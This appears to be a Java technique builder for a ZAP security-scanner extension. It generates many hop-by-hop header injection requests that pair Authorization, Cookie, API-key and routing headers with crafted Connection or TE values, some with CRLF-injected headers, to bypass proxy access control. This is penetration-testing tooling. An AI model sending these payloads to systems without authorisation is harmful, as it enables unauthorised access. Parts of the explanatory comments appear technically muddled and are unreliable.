package org.zaproxy.zap.extension.hacktor.technique;

import java.util.List;
import java.util.function.BiConsumer;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;

/**
 * Hop-by-hop header injection (RFC 7230 §6.1).
 *
 * <p>If a front-end proxy forwards a request to a back-end and the
 * {@code Connection} header names a header that the proxy applies as
 * hop-by-hop, the proxy MUST strip that header before forwarding. The
 * classic bypass: send a privileged header (Authorization, Cookie, custom
 * API key) along with {@code Connection: <that-header>}. The proxy strips
 * the header so its access-control check (which only fires when the header is
 * missing or matches a denylist) passes, while the back-end still receives
 * the request and processes it as if authenticated.
 *
 * <p>Sub-techniques:
 * <ul>
 *   <li><b>Classic</b> — auth-style header + {@code Connection: <header>};
 *       covers Authorization, Cookie, X-Api-Key, X-Auth-Token, X-Access-Token.</li>
 *   <li><b>Rare</b> — multiple Connection-listed headers in a single
 *       {@code Connection} header (comma-separated, with whitespace),
 *       {@code Connection: close} combined with a privileged header to
 *       force the proxy to strip it before forwarding, and {@code Connection:}
 *       listing a header that the back-end actually recognises.</li>
 *   <li><b>Novel</b> — {@code Connection} referencing a header the proxy
 *       passes-through but the back-end treats as privileged (e.g.
 *       {@code X-Original-URL}); {@code Connection: Authorization, Cookie}
 *       comma-list with CRLF padding in the header value; {@code TE: chunked}
 *       combined with a privileged header (TE is itself a hop-by-hop); and
 *       empty {@code Connection} header values that some proxies tolerate.</li>
 * </ul>
 */
public class HopByHopTechniqueBuilder extends AbstractTechniqueBuilder {

    @Override public String getFamily() { return "Hop-by-Hop"; }

    @Override public int getOrder() { return 62; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {

        // ── Classic — single privileged header + Connection: <header> ───
        String[] classicHeaders = {
            "Authorization", "Cookie", "X-Api-Key", "X-Auth-Token", "X-Access-Token"
        };
        for (String h : classicHeaders) {
            addHopByHop(techs, h, "bypass", h, "classic");
        }

        // ── Rare — comma-separated Connection with multiple headers ──────
        for (String h : classicHeaders) {
            final String connectionValue = h + ", Cookie";
            final String privileged = "bypass";
            markRawAdd(techs, new Technique(getFamily(),
                "HopByHopMulti:" + h,
                "Hop-by-hop with comma-list: Connection: " + connectionValue,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    addHeader(c, h, privileged);
                    addHeader(c, "Connection", connectionValue);
                    return c;
                }));
        }

        // ── Rare — Connection: close (force-strip the privileged header) ─
        for (String h : classicHeaders) {
            final String privileged = h;
            markRawAdd(techs, new Technique(getFamily(),
                "HopByHopClose:" + h,
                "Connection: close paired with privileged header: " + h,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    addHeader(c, h, "bypass");
                    addHeader(c, "Connection", "close");
                    return c;
                }));
        }

        // ── Rare — multiple privileged headers, single Connection ───────
        String[] multiPrivileged = {
            "Authorization", "Cookie", "X-Api-Key", "X-Auth-Token",
            "X-Access-Token", "X-CSRF-Token", "X-Original-URL", "X-Rewrite-URL"
        };
        for (int i = 0; i < multiPrivileged.length; i++) {
            for (int j = i + 1; j < multiPrivileged.length; j++) {
                final String h1 = multiPrivileged[i];
                final String h2 = multiPrivileged[j];
                final String connValue = h1 + "," + h2;
                markRawAdd(techs, new Technique(getFamily(),
                    "HopByHopDual:" + h1 + "+" + h2,
                    "Two privileged headers paired with Connection: " + connValue,
                    base -> {
                        HttpMessage c = cloneMsg(base);
                        addHeader(c, h1, "bypass");
                        addHeader(c, h2, "bypass");
                        addHeader(c, "Connection", connValue);
                        return c;
                    }));
            }
        }

        // ── Novel — Connection: <header> with whitespace / CRLF padding ─
        String[] paddedConnValues = {
            "  Authorization  ", "Authorization\r\nX-Injected: 1",
            "Authorization\t", " Authorization",
            "\tAuthorization\r\n", "Authorization , Cookie"
        };
        for (String cv : paddedConnValues) {
            markRawAdd(techs, new Technique(getFamily(),
                "HopByHopPaddedConn",
                "Connection with whitespace/CRLF padding: '" + cv.replace("\r", "\\r").replace("\n", "\\n").replace("\t", "\\t") + "'",
                base -> {
                    HttpMessage c = cloneMsg(base);
                    addHeader(c, "Authorization", "bypass");
                    addHeader(c, "Connection", cv);
                    return c;
                }));
        }

        // ── Novel — TE: chunked combined with privileged header ─────────
        // TE is itself hop-by-hop (RFC 7230 §4.3); some proxies treat the
        // whole TE/Connection chunked-trick as a strip trigger.
        String[] teVariants = {"chunked", "trailers", "gzip", "chunked, trailers"};
        for (String te : teVariants) {
            final String t = te;
            markRawAdd(techs, new Technique(getFamily(),
                "HopByHopTE:" + te,
                "TE: " + te + " combined with privileged header (TE-as-hop-by-hop)",
                base -> {
                    HttpMessage c = cloneMsg(base);
                    addHeader(c, "TE", t);
                    addHeader(c, "Authorization", "bypass");
                    addHeader(c, "Connection", "TE");
                    return c;
                }));
        }

        // ── Novel — Connection referencing proxy/routing headers ───────
        // Some proxies route on X-Original-URL / X-Rewrite-URL but the
        // back-end does not recognise them — making the header a usable
        // hop-by-hop that the proxy strips before its routing check.
        String[] proxyHeaders = {
            "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-URL",
            "X-Forwarded-Host", "X-Forwarded-For"
        };
        for (String ph : proxyHeaders) {
            final String p = ph;
            markRawAdd(techs, new Technique(getFamily(),
                "HopByHopProxyHdr:" + ph,
                "Privileged proxy-header paired with Connection: " + ph,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    addHeader(c, p, "bypass");
                    addHeader(c, "Connection", p);
                    return c;
                }));
        }

        // ── Novel — Connection with quoted / folded header tokens ──────
        String[] quotedConn = {
            "\"Authorization\"", "\"Authorization, Cookie\"",
            "Authorization\\r\\nX-Bypass: 1"
        };
        for (String qc : quotedConn) {
            final String v = qc;
            markRawAdd(techs, new Technique(getFamily(),
                "HopByHopQuoted",
                "Connection with quoted/folded token: " + qc,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    addHeader(c, "Authorization", "bypass");
                    addHeader(c, "Connection", v);
                    return c;
                }));
        }

        // ── Novel — empty / blank Connection header (some proxies strip) ─
        markRawAdd(techs, new Technique(getFamily(),
            "HopByHopEmpty",
            "Empty Connection header paired with Authorization",
            base -> {
                HttpMessage c = cloneMsg(base);
                addHeader(c, "Authorization", "bypass");
                addHeader(c, "Connection", "");
                return c;
            }));
    }

    private void addHopByHop(List<Technique> techs, String header, String value,
                             String connectionValue, String kind) {
        final String h = header, v = value, cv = connectionValue;
        markRawAdd(techs, new Technique(getFamily(),
            "HopByHop[" + kind + "]:" + header,
            "[" + kind + "] Hop-by-hop: " + header + " + Connection: " + connectionValue,
            base -> {
                HttpMessage c = cloneMsg(base);
                addHeader(c, h, v);
                addHeader(c, "Connection", cv);
                return c;
            }));
    }
}